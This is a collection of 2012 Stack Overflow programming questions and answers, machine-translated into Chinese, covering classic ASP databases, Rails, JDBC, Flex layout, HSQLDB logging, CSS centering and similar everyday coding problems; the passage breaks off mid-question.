除了非常基础的知识外，我对这里的 asp 一点都不了解。但是，我想创建一个纯粹基于 ASP 的购物车。购物车应具有添加产品时自动更新的功能。我已经准备好 html 页面，但我不知道如何连接数据库并使用 ASP 执行操作。请帮我。它应该是一个电子商务网站。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T19:57:43.923

如果您使用 microsoft-access 作为数据库，则可以使用此代码连接到您的数据库。只需更改您的数据库和表名

```
set conob = Server.CreateObject("ADODB.Connection")
conob.Provider="Microsoft.Jet.OLEDB.4.0"
conob.Open "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & server.MapPath("YourDatabaseName.mdb")
Set rsuni = Server.CreateObject("ADODB.Recordset")
sqlStr="select * from Student_Entry"

rsuni.open sqlStr,conob 
```

如果您使用的是 sql server，请转到[此链接](https://stackoverflow.com/questions/5216151/cannot-connect-from-classic-asp-to-sql-server-2008-r2-using-sql-native-client-w)。之前贴过答案

# ruby-on-rails - 属性未在 PUT 请求上更新

> ID：12760059
> 
> 赞同：0
> 
> 时间：2012-10-06T13:06:26.173
> 
> 标签：ruby-on-rails, ruby

我目前有一个设置了 2 个模型的用户系统 --> 计划模型 has_many 用户。

我想实现的是一种允许用户升级/降级他们的计划的方法。为此，我在控制器中创建了一个名为“update_plan”的 POST 操作，当用户向其发布新的 Plan_id 时，用户的 plan_id 会发生变化，因此会订阅不同的计划。

当我发布到更新计划控制器时，尽管用户的 plan_id 没有改变。我通过去控制台验证了这一点，并做

```
user = User.find(1)
user.plan.id 
```

第二次检查plan_id时，没有任何变化。

这是我的表单更改计划 ID 的样子

```
 <%= form_tag("/users/update_plan", :method => "post" ) do %>

                        <%= hidden_field_tag :plan_id, plan.id %>

                        <%= submit_tag("Change To Plan", :class => "signup") %>

                      <% end %> 
```

这是用户控制器中的更新计划操作

```
 def update_plan
    @user = current_user
    if @user.update_attributes(params[:plan_id])
      flash[:success] = "Profile updated"
      sign_in @user
      redirect_to change_plan_path
    else
      render change_plan_path
      flash[:errors] = "Oops, something went wrong with the Update. Please Talk To Support"
    end
  end 
```

我不太确定错误在哪里，因为我不太确定上面写的核心。

您将如何更新用户 plan_id 的参数？非常感谢任何帮助

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T13:12:14.747

`@user.update_attributes(params[:plan_id])`不会以您期望的方式更新用户。`update_attributes`需要一个包含与模型的列名匹配的键的哈希。

要更新单个列，请尝试以下操作：

```
@user = current_user
@user.plan_id = params[:plan_id]
@user.save 
```

另一种方法是传递`update_attributes`带有 plan_id 的哈希（假设`plan_id`可以批量分配）：

```
@user.update_attributes({:plan_id => params[:plan_id]}) 
```

# javascript - Vimeo API 在特定时间自动暂停

> ID：12760063
> 
> 赞同：0
> 
> 时间：2012-10-06T13:07:12.270
> 
> 标签：javascript, api, vimeo

我想知道 vimeo 的 JavaScript API 是否允许视频自动 - 在播放的某个点暂停（例如，在视频播放 55 秒后） - 然后等待用户单击视频以恢复播放。

任何帮助都会很棒，因为我对 JavaScript 很陌生。

这是 vimeo js 网站：http: [//developer.vimeo.com/player/js-api](http://developer.vimeo.com/player/js-api)

谢谢-

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T13:16:07.620

使用嵌入式 Flash 播放器，这样的事情应该可以工作：

```
document.getElementById('vimeo_player').api_addEventListener('play', function(event) {
    window.setTimeout('document.getElementById("vimeo_player").pause()', 55000);
}) 
```

# android - 降低 minSdkVersion：我的应用程序可以在较低的 SDK 版本上运行吗？

> ID：12760066
> 
> 赞同：1
> 
> 时间：2012-10-06T13:07:48.980
> 
> 标签：android

我开发了一个与 SDK 级别 10 兼容的应用程序。为了使该应用程序可供更广泛的用户使用，我正在考虑将 API 级别降低到 8。

是否像更改`minSdkVersion`清单中的值一样简单？如何确保我没有使用仅在 API>=10 上存在的任何 API 调用？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T13:27:41.617

您的应用程序将在以前的平台上运行，前提是您没有使用以前平台上不可用的 API 部分。要做的一件事是尝试针对较低平台进行编译（您可以在 SDK 管理器中安装较低平台）。编译错误（如果有）将指出代码中使用非现有 API 的位置。此外，在最近的平台上编译时，请注意*已弃用*的警告。

# java - 如何使用Java将数据插入mysql

> ID：12760069
> 
> 赞同：1
> 
> 时间：2012-10-06T13:08:26.020
> 
> 标签：java, mysql

我正在尝试使用 Java 将数据插入 mysql 数据库。我正在使用以下代码从数据库中获取数据，并且工作正常。

```
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;

public class DbTest {

public static void main (String[] args) throws Exception{

    // Accessing Driver From Jar File
    Class.forName("com.mysql.jdbc.Driver");

    //DB Connection
    Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/test","root","");  

    // MySQL Query
    PreparedStatement statement= con.prepareStatement("SELECT * FROM jam WHERE id='1'");

    //Creating Variable to execute query
    ResultSet result=statement.executeQuery();

    while(result.next()){

        System.out.println(result.getString(2));

    }

  }

  } 
```

要插入数据，我试过上面的代码只替换

```
PreparedStatement statement= con.prepareStatement("SELECT * FROM jam 
 WHERE id='1'"); 
```

和

```
 PreparedStatement statement= con.prepareStatement("INSERT INTO jam(id,name) 
 VALUES ('','Charlie Sheen')"); 
```

但它显示了一些错误。您能否告诉我代码中的问题出在哪里。

谢谢 ：）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-06T13:14:37.297

如果你的主键是自动递增的，你可以试试这个；

```
 PreparedStatement statement= con.prepareStatement("INSERT INTO jam(name) 
     VALUES (?)");

    statement.setString(1,"Charlie Sheen");

statement.execute(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T13:25:17.043

如果您必须插入大量记录，请使用批量插入

```
 import java.sql.Connection;
    import java.sql.PreparedStatement;

    //...

    String sql = "INSERT INTO jam(id, name) VALUES (?, ?)";
    Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/test","root","");  
 PreparedStatement ps = connection.prepareStatement(sql);

    for (Employee employee: employees) {
        ps.setString(1, employee.getId());
        ps.setString(2, employee.getName());
        ps.addBatch();
    }
    ps.executeBatch();
    ps.close();
    connection.close(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T13:26:47.097

我想你也可以使用这个（如果 ID 是自动递增的）

```
"INSERT INTO jam(name) VALUES ('Charlie Sheen')" 
```

无论如何，如果您不知道特定 int 字段的值我建议不要将其写入查询中，它将默认设置。

我认为，如果你设置和 INTEGER column = ''，这可能是 mysql 的问题。

通常，我不会在 ->'' 中输入数字

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-02-10T03:06:57.493

```
@PostMapping("/save")
public void save(@RequestBody EmployeeListModel employeeListModels) throws SQLException{

    Connection connection=MyDataSource.getConnection(); 

     try{

    connection.setAutoCommit(false);
    PreparedStatement statement = connection.prepareStatement("insert into employee(Id,first_name,last_name,email) values (?,?,?,?)");
    List<EmployeeModel> employeeModels = employeeListModels.getModels();

    Iterator<EmployeeModel> iterator = employeeModels.iterator();

    while(iterator.hasNext()){
        EmployeeModel model = iterator.next();
        statement.setInt(1, model.getId());
        statement.setString(2, model.getFirstName());
        statement.setString(3, model.getLastName());
        statement.setString(4, model.getEmail());
        statement.addBatch();

    }

    int[] updates = statement.executeBatch();

    for(int i=0;i<updates.length;i++){
        if(updates[i] == -2){
            System.out.println("executed fail"+i);
        }
        else{
            System.out.println("executed:"+i+"successful"+updates[i]+"updated");
        }

    }

    connection.commit();
    statement.close();
    connection.close();
     }catch (Exception e) {
        e.printStackTrace();
    } 
```

# math - 用于大数的 Arduino 模块化算术

> ID：12760075
> 
> 赞同：1
> 
> 时间：2012-10-06T13:09:15.760
> 
> 标签：math, modular, largenumber

我写了一个代码来绕过大数字：问题是，有一个小问题我似乎无法抓住它。它是准确的，直到指数或 b 为 2，然后是 3-4，稍微偏离，然后是 5-6，它才开始偏离真实答案。

```
#include <iostream>
#include <conio.h>
using namespace std;

unsigned long mul_mod(unsigned long b, unsigned long n, unsigned long m);

unsigned long exponentV2(unsigned long a, unsigned long b, unsigned long m);

int main()
{
    cout << exponentV2(16807, 3, 2147483647);
    getch();
}

unsigned long exponentV2(unsigned long a, unsigned long b, unsigned long m)
{
   unsigned long result = (unsigned long)1;
   unsigned long mask = b;    // masking

   a = a % m;
   b = b % m;

   unsigned long pow = a;

   // bits to exponent
   while(mask)
   {
     //Serial.print("Binary: ");  // If you want to see the binary representation,     uncomment this and the one below
     //Serial.println(maskResult, BIN);
      //delay(1000);  // If you want to see this in slow motion 
     if(mask & 1)
     {
            result = (mul_mod(result%m, a%m, m))%m;

           //Serial.println(result);  // to see the step by step answer, uncomment this
     }
     a = (mul_mod((a%m), (a%m), m))%m;
     //Serial.print("a is ");
     //Serial.println(a);
     mask = mask >> 1;          // shift 1 bit to the left

   }
   return result;
}

unsigned long add_mod(unsigned long a, unsigned long b, unsigned long m)
{
    a = a%m;
    b = b%m;
    return (a+b)%m;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-03T13:55:50.337

我只是看了你的代码，发现了几件事：

在功能上：

```
unsigned long exponentV2(unsigned long a, unsigned long b, unsigned long m); 
```

*   我知道这个函数返回 a^b mod m
*   在初始化中，您销毁指数 (b=b%m) 这会使结果无效！！！删除该行

在功能上：

```
unsigned long add_mod(unsigned long a, unsigned long b, unsigned long m); 
```

*   你不处理溢出（如果 a+b 大于 long 怎么办？）
*   在那种情况下 (a+b)%m 是错误的，...
*   如果发生溢出，您应该从结果中减去 m*x 而不是取模。
*   x 必须一样大，所以 m*x 几乎是 long 的大小以消除溢出......
*   所以 (a+b)-(m*x) 也适合长变量

要获得更多洞察力，请查看：[模块化算法和 NTT（有限域 DFT）优化](https://stackoverflow.com/q/18577076/2521214)

希望能帮助到你

# apache-flex - 将按钮定位到中心以在 flex 中改变宽度和高度

> ID：12760077
> 
> 赞同：0
> 
> 时间：2012-10-06T13:09:39.177
> 
> 标签：apache-flex

我想将我的按钮始终放在中心以适应任何变化的应用程序宽度和高度。

如何在mxml中实现？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T13:49:00.167

你想把你的按钮放在什么的中心？有时我认为这样的代码最好在 ActionScript 中作为 updateDisplayList() 方法的一部分来完成。但是，如果您想在 MXML 中执行此操作：

```
<buttonContainer id="container">
 <s:Button x="{container.width/2}" y="{container.height/2}" />
</buttonContainer> 
```

从概念上讲，这应该适用于任何容器。一些容器使它更容易一些；比如一个VGroup：

```
<s:VGroup horizontalAlign="Center" verticalAlign="middle">
     <s:Button />
</s:VGroup> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T20:13:57.803

如果你的容器`Button`有一个绝对布局（[BasicLayout](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/spark/layouts/BasicLayout.html)），它就像使用`UIcomponent`'s Horizo [​​ntalCenter](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/mx/core/UIComponent.html#horizontalCenter)和[verticalCenter](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/mx/core/UIComponent.html#verticalCenter)属性一样简单：

```
<s:Group width="400" height="300">
    <s:Button horizontalCenter="0" verticalCenter="0" />
</s:Group> 
```

`BasicLayout`是每个 Spark 容器的默认布局。mx 组件没有单独的布局类，但概念是一样的：默认情况下定位是绝对的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-08T06:56:50.237

我找到了将按钮放置在舞台中央以适应任何变化的舞台宽度和高度的确切解决方案

```
button.x=(stage.stageWidth-button.width)/2;
button.y=(stage.stageHeight-button.height)/2; 
```

# java - FindBugs Ant 任务是否需要 JAR？

> ID：12760078
> 
> 赞同：4
> 
> 时间：2012-10-06T13:09:44.570
> 
> 标签：java, ant, jar, war, findbugs

[Ant 任务](http://findbugs.sourceforge.net/manual/anttask.html)的FindBugs 文档有点混乱。传统上，我一直通过 Eclipse 插件使用 FindBugs，您只需在其中选择项目并单击“FindBugs”即可获得报告。

在`findbugs`Ant 任务中，有一个嵌套`<class>`元素：

> A[n] 可选嵌套元素，指定要分析的类。

根据我看到的示例，看起来 FB 实际上要求您首先 JAR 您的项目，然后再在其上运行 FB 任务。

有人可以确认这一点并解释`class`元素是什么吗？对于像我这样的新手来说，这个描述很模糊。

其次，更重要的是，我的项目实际上是一个 Java Web 应用程序 (WAR) 文件。

所以，如果我没记错的话，如果 FB 需要有一个 JAR 来进行分析，那么我的策略是在`<target name="findbugs">`目标内部创建我的项目的“临时 JAR”，并让它由我所有编译的 Java 类。这不会是可执行的，只会满足 FB 的要求，并且会在以后的构建中被删除。

我在这里离基地很远吗？Java Web 应用程序构建者在其 Ant 构建中使用 FB 的标准操作程序是什么？提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T17:30:22.510

如果您下载 FindBugs 本身（在我的情况下，版本 2.0.1）并从包含的批处理文件启动 gui，它会限制您可以放入项目中进行分析的文件类型：在“新建项目”对话框中，“jar ，战争，耳朵，拉链，sar”。所以，我想，压缩你的 .class 文件就足够了——毕竟，一个 .jar 只是你的 .class 文件在它们的文件夹结构中的一个压缩，加上添加的清单文件。

但是，如果您打开一个包含非压缩源文件的文件夹，FindBugs 仍然会尝试分析。

**[更新**我终于让 FindBugs ant 任务在我的系统上工作。它绝对适用于类文件。让它运行起来需要做很多工作，因为有一些棘手的问题需要阅读源代码才能解决。例如，包含您自己的 jars 是很棘手的，例如使用 log4j 日志记录，一些可以帮助您的参数是未记录的，并且要报告的错误的最低等级非常高，据我所知无法降低。如果您有任何问题，请告诉我，我很乐意提供帮助。**]**

# java - Java java.util.logging 记录器与 HSQLDB 结合的奇怪行为

> ID：12760080
> 
> 赞同：0
> 
> 时间：2012-10-06T13:09:47.263
> 
> 标签：java, hsqldb, java.util.logging

情况：我有一个静态数据库类，使用 HSQLDB，我也想在其中使用 Logging。

我设置了记录器，设置了所有语句，但是使用特定方法后，记录器似乎不再工作了。没有抛出异常，只是似乎已经死了。

这是记录器类：

```
public class GLogger {

    private static GFormatter   formatterHTML;
    private static FileHandler  fileHTML;
    private static boolean      isReady = false;

public static void setup() throws IOException {
    Logger logger = Logger.getLogger("");
    fileHTML = new FileHandler("conf/logging.html");
    formatterHTML = new GFormatter();
    fileHTML.setFormatter(formatterHTML);
    logger.addHandler(fileHTML);
    isReady = true;
}

public static boolean isReady() {
    return isReady;
}
} 
```

这是（部分）数据库类：

```
public class Database {

private static final Logger LOG = Logger.getLogger(Database.class.getName());
/**
 * The database server class
 */
private static Server       hsqlServer;

/**
 * The connection class. Used to manage request to the database.
 */
private static Connection   connection;

/**
 * The name of the database
 */
private static String       dbName;

public Database(String databaseName, String fileName) {

    LOG.setLevel(Level.FINEST);

    hsqlServer = null;
    connection = null;

    dbName = databaseName;

    // ###### LOGGER ######
    LOG.finest("Creating a new database server class");
    // ####################
    hsqlServer = new Server();

    hsqlServer.setLogWriter(null);
    hsqlServer.setSilent(true);

    hsqlServer.setDatabaseName(0, dbName);
    hsqlServer.setDatabasePath(0, "file:db/" + fileName);
}

/**
 * Start the new database class.
 */
public static void start() {

    // ###### LOGGER ######
    LOG.finest("Starting a new database class");
    // ####################
    hsqlServer.start();
    connection = null;
}

/**
 * Start the new connection to the specified database, using the default username "sa" e no password
 */
public static void connect() {
    try {
        // ###### LOGGER ######
        LOG.finest("Getting a connection to the newly started database");
        // ####################
        Class.forName("org.hsqldb.jdbcDriver");
        // Default user of the HSQLDB is 'sa' with an empty password
        connection = DriverManager.getConnection("jdbc:hsqldb:hsql://localhost/garby", "sa", "");
    } catch (ClassNotFoundException e) {
        // ###### LOGGER ######
        LOG.severe("Impossible to connect to the database. ClassNotFound");
        // ####################
    } catch (SQLException e) {
        // ###### LOGGER ######
        LOG.finest("Impossible to connect to the database. " + e.getCause());
        // ####################
    }
}
// ... more other stuff, not important and then the main method:
public static void main(String[] args) {
    if (!GLogger.isReady()) {
        try {
            GLogger.setup();
        } catch (Exception e) {

        }
    }
    new Database("garby", "garbydb");
    Database.start();
    Database.connect();
    Database.tableStructureCreation();
    Database.populateFromFile("conf/populateServ.txt", "services");
    System.out.println(Database.listServices());
    Database.stop();
} 
```

我删除了与我的问题无关的所有方法和其他操作。

如果我运行该类，一切正常（！！数据库添加了正确的结构和数据，用倒数第二行“system.out”验证）。不工作的东西应该是记录器。

如果我打开 html 文件（为简单起见，我省略了 htmlFormatter，这没有用，它只格式化日志消息），我只能读取两行，一行在构造函数中，另一行在 start() 方法中。

经过几次尝试，我明白问题出在这条线上

```
hsqlServer.start(); 
```

在公共静态无效开始（）；方法。

事实上，如果我主要在 Database.start() 之前移动 Database.connect()，我可以读取 4 条消息（1 条来自构造函数，2 条来自连接 [得到一个连接......不可能连接。 ..] 和 1 从一开始），然后什么都没有。

如果我评论该行 [hsqlServer.start()] 我可以读取所有日志消息（显然，直到由于缺少语句而在某处抛出 NullPointerException）。

我真的不知道为什么以及如何解决这个问题。这件事阻止了我所有的程序日志消息，因为显然“数据库”类几乎在任何其他类之前启动并阻止了所有日志消息。

有任何想法吗？先感谢您

[再次，对不起我的英语不好，我希望我可以理解] 编辑：我也删除了 Javadoc 评论 - 没用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-06T13:34:01.307

如果存在，HSQLDB 将使用 java.util.logging 或 Log4J。它重新配置日志记录设置以使日志记录正常工作。如果您自己配置日志记录，则必须包括系统属性设置 hsqldb.reconfig_logging=false。然后，您需要配置要包含 HSQLDB 日志消息的级别。请参阅指南：

[http://hsqldb.org/doc/2.0/guide/management-chapt.html#mtc_jdc_logging](http://hsqldb.org/doc/2.0/guide/management-chapt.html#mtc_jdc_logging)

在启动服务器之前设置系统属性的一种方法是：

```
 System.setProperty("hsqldb.reconfig_logging", "false"); 
```

# java - 如何使用Java中的for循环生成具有不同变量名的n个实例

> ID：12760082
> 
> 赞同：1
> 
> 时间：2012-10-06T13:10:08.037
> 
> 标签：java

我正在尝试运行一个模拟，其中在 for 循环中生成了一系列人，然后我在不同的类中使用它们来执行某些任务。

我不太确定如何生成 n 个人员对象，同时让程序都可以访问它们（即具有变量名，以便我可以使用他们的方法）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T13:21:29.043

**-**使用`Collection`框架

**-** `Map`将适合此实施。

```
Map<String,Person> personMap = HashMap<String,Person>();

personMap.put("person1",new Person("Vivek"));
personMap.put("person2",new Person("Vicky")); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T13:13:49.250

您通常无法从正在运行的程序中创建新的源代码（除非您使用字节码生成和类加载器，我认为您在这里不需要）。

代替

```
Person a = new Person("A");
Person b = new Person("B");
a.doStuff();
b.doStuff(); 
```

考虑有一张地图（未经测试）：

```
Map<String, Person> map = new HashMap();
map.put("a", new Person("A"));
map.put("b", new Person("B"));

map.get("a").doStuff(); // on A
map.get("b").doStuff(); // on B 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-06T13:14:05.890

您可以使用数组。

```
// create people
int n = 30;
Human[] human = new Human[n];    
for (int i=0; i<n; i++) {
  human[i] = new Human();
}

// access specific person
human[3].doSomething();
// access all people
for (Human h:human) {
  h.doSomething();
} 
```

替代方案：使用人员列表/集合/地图。

# objective-c - 以编程方式更改锁屏壁纸iphone

> ID：12760085
> 
> 赞同：0
> 
> 时间：2012-10-06T13:10:40.700
> 
> 标签：objective-c, ios, wallpaper, lockscreen

> **可能重复：**
> [以编程方式更改 iOS 锁定屏幕](https://stackoverflow.com/questions/6243591/programatically-changing-the-ios-lock-screen)

我是 iphone 新手，我想知道我是否可以通过应用程序以编程方式更改我的 iphone 锁屏壁纸。

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-06T13:12:47.627

`NO`您不能以编程方式更改 iPhone 锁屏壁纸。（越狱手机除外）

# facebook-like - 溢出：自动无法在 Facebook 上正常使用 Like Comment Flyout

> ID：12760086
> 
> 赞同：2
> 
> 时间：2012-10-06T13:10:54.423
> 
> 标签：facebook-like, overflow

为了节省我试图解释它的时间，这里有一个“工作”的例子：

[http://jsfiddle.net/z56Dt/19/](http://jsfiddle.net/z56Dt/19/)

当您单击“滑动”按钮时，div 高度会按应有的方式扩展。但是当您单击 Like 按钮时，它会获得滚动条。我什至无法将 onclick 事件添加到类似 fb 的 DIV 中。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-13T19:51:20.837

我有/有同样的问题......将溢出设置为自动它会添加滚动条。将溢出设置为可见它工作正常......我的问题是我需要将父 div 设置为溢出：自动以使布局看起来不错。

# css - 通过调整边距用多个子 div 填充父 div

> ID：12760088
> 
> 赞同：0
> 
> 时间：2012-10-06T13:11:09.863
> 
> 标签：css, html, css-float, margin

是）我有的：

一个父 div `.parent`，它将整个窗口`width=100%`作为宽度，但有一定的最小宽度，比如说`min-width=800px`.

现在我有大约 20 个`.child`div，比方说，使用宽度为`width=300px`、未定义的高度`margin:20px`和`display:inline-block`.

现在的问题是，例如在较小的屏幕上，每行将显示两个 div，但它们将不再居中，因为它们的邻居掉到了下一行。

我尝试`float:center`了`margin:5px auto 5px auto;`孩子们，但浮动似乎根本不起作用，边距只是导致 0 边距

所以我想要的是：

通过调整它们之间的边距，使父级中的所有子 div 水平居中，同时仍使用例如屏幕宽度的 80%。第 2 部分更多是可选的

现在看起来如何（当然不工作）

HTML

```
<div class="buttons">
    <div class="host 1">&nbsp;</div>
    <div class="host 2">&nbsp;</div>
    <div class="host 3">&nbsp;</div>
    <div class="host 4">&nbsp;</div>
    <div class="host 5">&nbsp;</div>
    ...
</div> 
```

CSS

```
.buttons {
    position:relative;
    width:100%;
    margin:50px 0 0 0;
    padding:0;
}
.host {
    display:inline-block;
    padding:0;
    margin:20px 20px 5px 20px;
    height:20px;
    width:300px;
    float:center;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T13:27:06.470

要将它们水平居中，请添加`text-align:center;`到父级：

```
.buttons {
    position:relative;
    width:100%;
    margin:50px 0 0 0;
    padding:0;
    text-align:center;
} 
```

[**演示**](http://jsfiddle.net/gionaf/rcAQc/)

* * *

## 四周边距相等

可能有数百种更好的方法可以做到这一点，但是......这是我在星期六慵懒的下午:)

[**演示**](http://jsfiddle.net/gionaf/B6Xec/)（调整窗口大小）

（与上面相同的html和css）

```
var hosts = $('.host');
var buttons= $('.buttons');
$(window).on('load resize',function(){
    var w = buttons.width();
    /* how many .host in one row ? */
    var oneRow = Math.floor(w/300);
    /* let's go! */
    if(oneRow>1){
        /* send hosts to the margin calculation function */
        calcMargins(hosts,w,oneRow);
        /* do we have some orphans?! */
        var orphans = hosts.length%oneRow;
        if(orphans!=0){
            /* let's do the same for them */
           var orphansEl = hosts.slice(-orphans);
           calcMargins(orphansEl,w,orphans);
       }
    }else{
        /* there's only one div per row, so
            we reset everything */
        hosts.css({'margin-left':'auto','margin-right':'auto','float':'none'});
    }
});

/* here's the function */
function calcMargins(els,l,r){
    /* total blank space */
    var tSpace = l - (r*300);
    /* we'll add a right margin for each .host and
         a margin-left for the first of each row */
    var nElements = r + 1; 
    /* it's better to leave some pixels behind
        than cause a line wrap, so we'll floor the division */
   var rightMargin = Math.floor(tSpace/nElements);
   /* finally, we set the margins */
   els.each(function(i){
       if(i%r == 0){
           /* left margin for first .host of each row */
           leftMargin = rightMargin;
       }else{
           /* left margin for the rest */
           leftMargin = 0;
       }
       /* here we go */
       $(this).css({'float':'left','margin-left':leftMargin,'margin-right':rightMargin});
    });
}​ 
```

显然，为了清楚起见，它是这样写的，但您可以将其简化为：

```
var hosts = $('.host'), buttons= $('.buttons');
$(window).on('load resize',function(){
    var w = buttons.width(), oneRow = Math.floor(w/300);
    if(oneRow>1){
        calcMargins(hosts,w,oneRow);
        var orphans = hosts.length%oneRow;
        if(orphans!=0) calcMargins(hosts.slice(-orphans),w,orphans);
    }else{
        hosts.css({'margin-left':'auto','margin-right':'auto','float':'none'});
    }
});
function calcMargins(els,l,r){
   var rightMargin = Math.floor((l-(r*300))/(r+1));
   els.each(function(i){
       leftMargin = (i%r == 0) ? rightMargin : 0;
       $(this).css({'float':'left','margin-left':leftMargin,'margin-right':rightMargin});
    });
}​ 
```

如果你不希望“孤儿”居中，这里有一个更小的版本：

```
var hosts = $('.host'), buttons= $('.buttons');
$(window).on('load resize',function(){
    var l = buttons.width(), r = Math.floor(l/300);
    if(r>1){
       var rightMargin = Math.floor((l-(r*300))/(r+1));
       hosts.each(function(i){
           leftMargin = (i%r == 0) ? rightMargin : 0;
           $(this).css({'float':'left','margin-left':leftMargin,'margin-right':rightMargin});
        });
    }else{
        hosts.css({'margin-left':'auto','margin-right':'auto','float':'none'});
    }
}); 
```

...附带一个**[演示](http://jsfiddle.net/gionaf/B7tGT/)**。

* * *

如果有人有更短的解决方案，我很想学习它:)

# postgresql-9.0 - PostgreSQL / 转储 9.0 并在 9.2 中重新导入

> ID：12760090
> 
> 赞同：0
> 
> 时间：2012-10-06T13:11:22.873
> 
> 标签：postgresql-9.0, pg-dump, postgresql-9.2

当转储我的数据库 9.0 以在 9.2 中重新导入它时，我遇到了模式问题。

例如，我在模式**foo**中的表格栏是这样导出的：

```
SET search_path = foo, pg_catalog;
...
CREATE TABLE bar (
   ...
);
ALTER TABLE foo.bar OWNER TO johndoe; 
```

在 9.2 中导入它不能按预期工作，因为表格**栏**是在模式**'public'**中创建的。*ALTER TABLE*语句失败并显示' *ERROR: relationship "foo.bar" doesn't exist'*。

我认为转储文件中的 *pg_dump* 命令发出的 'SET search_path' 指令可以设置默认模式（并且在 9.0 中导入时有效），但在 9.2 中无效。

有没有办法使 pg_dump 输出与显式模式名称不同？我错过了配置指令吗？

提前感谢您的帮助！

莱昂内尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-07T19:25:16.637

我替换了转储文件中需要显式模式名称的每个元素，它完成了工作......没什么大不了的。

# xcode - 在 OS X 上使用 OpenNI OpenCV 和 PCL 编译项目的简单方法

> ID：12760092
> 
> 赞同：2
> 
> 时间：2012-10-06T13:11:39.457
> 
> 标签：xcode, opencv, cross-compiling, openni, point-cloud-library

我需要在 OS X 上创建使用 OpenNI OpenCV 和 PCL 的项目。我已经安装了所有东西。我已经通过运行 OpenNI、NITE 和 PCL 的示例进行了检查。我搜索了很多关于编译的信息，但只能找到单独的解释。还有很多问题没有答案。我也尝试过编译和使用 Xcode 4.5，但我发现的教程是关于旧版本的 Xcode。而且我为 Xcode 4 找到的那个不起作用。

据我了解，有 3 种编译方法。CMakeLists、Makefile、Xcode。

正如我所说，我可以使用 cmake 编译 PCL 示例，如“在您自己的项目中使用 PCL”指南中所述。我还可以编译 OpenNI xxx 示例，只需输入 src 目录并调用“make”。

但是如何将它们整合在一起呢？我需要以某种方式合并两个makefile？有很多指令我不明白。

也许我需要更多的 Xcode 方式，因为我可能会调试。

我做错了什么以及如何在这里添加 OpenCV 和 PCL？

我创建了新的项目命令行工具 c++ 类型。

![](../Images/a9bedc094c92f41a53794e137cd16eef.png)
![](../Images/8e5a2229e27c579a1a81e3a26554365b.png)

然后从示例目录添加文件![](../Images/78432470ce3bb5d8985aafc68721b9e2.png)
![](../Images/23a3ee736b5070c643fae6ae834840cb.png)

![](../Images/4641f51dd5bc46d778431d2375b0932d.png)

我已删除 main.cpp

Config:
![](../Images/4d28a318a2dc99770112ef85e39aeecc.png)

![](../Images/99068c8f4b35eb1cce5020b6b077f2a3.png)

![](../Images/8b4255b99fc4c4f4df97e28a9a7b1778.png)

![](../Images/cebf95600002b02aaf9ffd9895900f96.png)

![](../Images/bc6f949b51aa9273c737d26c6f1a1da9.png)

Build
![](../Images/bd3cb63f5e58fbc08070900f05affc2e.png)

1 error here

![](../Images/1ec62cd8b973d38d4132d8d9bfff3552.png)

```
.../Samples/NiViewer/Draw.h:31:10: 'GL/gl.h' file not found 
```

# php - PHP eAccelerator 与脚本执行冲突

> ID：12760096
> 
> 赞同：1
> 
> 时间：2012-10-06T13:12:02.267
> 
> 标签：php, try-catch, eaccelerator

自从我在开发本地服务器上打开 eAccelerator 后，发生了一件奇怪的事情。无论脚本上下文如何，它都会发生，因此无论我是在单独的 .php 中运行此代码还是实际上期望在应用程序中捕获抛出的错误都无关紧要。

这给出了一个`Fatal Error: Uncaught exception`

```
try {
    throw new \Exception("Get out of here asap.");
    echo 'We never make it to here..';
 }  
 catch ( \Exception $e ) {
    echo 'Caught exception: ',  $e->getMessage(), "\n";
 } 
```

但如果我关闭 eAccelerator，一切都会正常工作。好吧..至少这个问题不会发生。

我在 win xp 32 sp3 上使用 Uniform 服务器的最新安装和 php 5.4.7 和 Apache 2.4.3

编辑：命名空间和非命名空间文件相同。编辑：我更正了语法错误>。>非常抱歉。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T13:17:36.230

您应该只运行以下两者之一：eaccelerator 或 APC。他们都做同样的事情，操作码缓存你编译的 PHP。我会选择 APC，因为您还可以将其用户缓存用于内存缓存——大多数框架都支持将其用作缓存后端。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T13:18:08.120

好吧，不确定这是否仅仅是因为您编写了简化的测试用例。

但是在您提供的代码中，该`try` 块永远不会关闭。所以很可能你抛出的异常永远不会被捕获......

# asp.net - 格式化和验证 asp:DetailsView 中的文字控件

> ID：12760099
> 
> 赞同：1
> 
> 时间：2012-10-06T13:12:27.700
> 
> 标签：asp.net, vb.net, formatting, validation, code-behind

在 DetailsView 中，其中一个控件是名为 PrimaryPhone 的 TextBox。

PrimaryPhone 使用 ASP:literal 控件中的 string.Format 进行格式化。

数据在数据库中是这样存储的：

```
9781231234 
```

